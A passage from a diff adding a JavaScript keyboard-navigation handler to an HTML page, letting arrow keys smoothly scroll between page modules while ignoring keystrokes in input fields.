+
+// ==================== Keyboard Navigation ====================
+document.addEventListener('keydown', (e) => {
+  if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) return;
+
+  const currentIndex = Array.from(modules).findIndex(m => {
+    const rect = m.getBoundingClientRect();
+    return rect.top < window.innerHeight / 2 && rect.bottom > window.innerHeight / 2;
+  });
+
+  if (e.key === 'ArrowDown' || e.key === 'ArrowRight') {
+    if (currentIndex < modules.length - 1) {
+      modules[currentIndex + 1].scrollIntoView({ behavior: 'smooth' });
+    }
+    e.preventDefault();
+  }
+  if (e.key === 'ArrowUp' || e.key === 'ArrowLeft') {
+    if (currentIndex > 0) {
+      modules[currentIndex - 1].scrollIntoView({ behavior: 'smooth' });
+    }
+    e.preventDefault();
+  }
+});
+</script>
+
+</body>
+</html>
